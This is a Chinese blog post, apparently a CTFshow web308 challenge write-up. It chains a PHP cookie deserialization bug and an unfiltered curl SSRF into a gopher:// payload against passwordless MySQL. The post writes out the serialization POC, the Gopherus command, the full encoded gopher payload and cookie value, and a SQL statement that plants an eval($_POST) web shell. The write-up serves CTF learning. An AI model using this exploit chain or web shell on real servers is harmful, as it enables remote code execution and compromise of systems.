@@ -1,0 +1,136 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="userq"><meta name="renderer" content="webkit"><meta name="copyright" content="userq"><meta name="keywords" content="MyBlog"><meta name="description" content="MyBlog"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>gopher协议无密码注入mysql · Mr.cheng's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="MyBlog" type="application/atom+xml">
+</head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">userq</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//1768161086.github.io/" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.cheng's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">gopher协议无密码注入mysql</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2025-05-23</span></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h2 id="CTFshow-代码审计-web308"><a href="#CTFshow-代码审计-web308" class="headerlink" title="CTFshow 代码审计 web308"></a>CTFshow 代码审计 web308</h2><p>1.题目描述：需要拿shell</p>
+<p>2.代码审计</p>
+<p>3.<strong>SQL注入：</strong></p>
+<p>无明显注入点，无SQL报错信息输出，insert语句都上了waf。SQL注入不可行。</p>
+<p>4.<strong>反序列化写入文件：</strong></p>
+<p>有无过滤的<code>file_put_contents()</code>函数却从未被调用。</p>
+<p>5.<strong>反序列化执行命令：</strong> public function clearCache()</p>
+<p>上了waf，只能输入大小写字母。</p>
+<p>6.在<code>fun.php</code>的<code>checkUpdate()</code>函数中发现了明显的SSRF特征代码，而且没有过滤。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function checkUpdate($url)&#123;</span><br><span class="line">        $ch=curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, false);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); </span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);</span><br><span class="line">        $res = curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>7.我们把所有有关的代码都整合起来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">//【index.php】</span><br><span class="line">$service = unserialize(base64_decode($_COOKIE[&#x27;service&#x27;]));</span><br><span class="line">if($service)&#123;</span><br><span class="line">    $lastVersion=$service-&gt;checkVersion();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//【dao.php】</span><br><span class="line">class dao&#123;</span><br><span class="line">    private $config;</span><br><span class="line"></span><br><span class="line">    public function checkVersion()&#123;</span><br><span class="line">            return checkUpdate($this-&gt;config-&gt;update_url);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//【config.php】</span><br><span class="line">class config&#123;</span><br><span class="line">    private $mysql_username=&#x27;root&#x27;;</span><br><span class="line">    //没有密码！！！！！</span><br><span class="line">    private $mysql_password=&#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">    public $update_url = &#x27;https://vip.ctf.show/version.txt&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//【fun.php】</span><br><span class="line">function checkUpdate($url)&#123;</span><br><span class="line">        $ch=curl_init();    </span><br><span class="line">        //...</span><br><span class="line">        $res = curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得出我们可以使用SSRF打无密码的mysql。SSRF的payload由<code>/index.php</code>反序列化传入。</p>
+<p>8.反序列化POC：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class dao&#123;</span><br><span class="line">    private $config;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">    $this-&gt;config=new config();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class config&#123;</span><br><span class="line">     public $update_url = &#x27;SSRF打无密码mysql的payload&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a= new dao();</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Gopherus工具对应文件夹开cmd控制台。工具下载地址<code>https://github.com/tarunkant/Gopherus</code></p>
+<p>9.kali下载Gopherus工具：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/tarunkant/Gopherus</span><br></pre></td></tr></table></figure>
+
+<p>10.运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit mysql</span><br></pre></td></tr></table></figure>
+
+<p>username:root</p>
+<p>execute:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>得到SSRFpayload：</p>
+<p>gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%46%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%01%00%00%00%01</p>
+<p>11.得到payload在index.php执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service=TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo3NjM6ImdvcGhlcjovLzEyNy4wLjAuMTozMzA2L18lYTMlMDAlMDAlMDElODUlYTYlZmYlMDElMDAlMDAlMDAlMDElMjElMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlNzIlNmYlNmYlNzQlMDAlMDAlNmQlNzklNzMlNzElNmMlNWYlNmUlNjElNzQlNjklNzYlNjUlNWYlNzAlNjElNzMlNzMlNzclNmYlNzIlNjQlMDAlNjYlMDMlNWYlNmYlNzMlMDUlNGMlNjklNmUlNzUlNzglMGMlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNmUlNjElNmQlNjUlMDglNmMlNjklNjIlNmQlNzklNzMlNzElNmMlMDQlNWYlNzAlNjklNjQlMDUlMzIlMzclMzIlMzUlMzUlMGYlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNzYlNjUlNzIlNzMlNjklNmYlNmUlMDYlMzUlMmUlMzclMmUlMzIlMzIlMDklNWYlNzAlNmMlNjElNzQlNjYlNmYlNzIlNmQlMDYlNzglMzglMzYlNWYlMzYlMzQlMGMlNzAlNzIlNmYlNjclNzIlNjElNmQlNWYlNmUlNjElNmQlNjUlMDUlNmQlNzklNzMlNzElNmMlNDYlMDAlMDAlMDAlMDMlNzMlNjUlNmMlNjUlNjMlNzQlMjAlMjIlM2MlM2YlNzAlNjglNzAlMjAlNjUlNzYlNjElNmMlMjglMjQlNWYlNTAlNGYlNTMlNTQlNWIlMzElNWQlMjklM2IlM2YlM2UlMjIlMjAlNjklNmUlNzQlNmYlMjAlNmYlNzUlNzQlNjYlNjklNmMlNjUlMjAlMjIlMmYlNzYlNjElNzIlMmYlNzclNzclNzclMmYlNjglNzQlNmQlNmMlMmYlMzElMmUlNzAlNjglNzAlMjIlM2IlMDElMDAlMDAlMDAlMDEiO319</span><br></pre></td></tr></table></figure>
+
+<p>12.访问1.php,post执行命令得到flag</p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://1768161086.github,io">userq</a></p><p> <span>Link:  </span><a href="http://1768161086.github,io/2025/05/23/gopher%E5%8D%8F%E8%AE%AE%E6%97%A0%E5%AF%86%E7%A0%81%E6%B3%A8%E5%85%A5mysql/">http://1768161086.github,io/2025/05/23/gopher%E5%8D%8F%E8%AE%AE%E6%97%A0%E5%AF%86%E7%A0%81%E6%B3%A8%E5%85%A5mysql/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2025/05/23/Redis%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A5%E5%8F%8A%E5%85%B6%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/" title="Redis命令执行以及其历史漏洞"><span>< PreviousPost</span><br><span class="prevTitle">Redis命令执行以及其历史漏洞</span></a><a class="nextSlogan" href="/2025/05/08/HG%E6%B3%84%E9%9C%B2/" title="HG泄露"><span>NextPost ></span><br><span class="nextTitle">HG泄露</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CTFshow-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-web308"><span class="toc-number">1.</span> <span class="toc-text">CTFshow 代码审计 web308</span></a></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
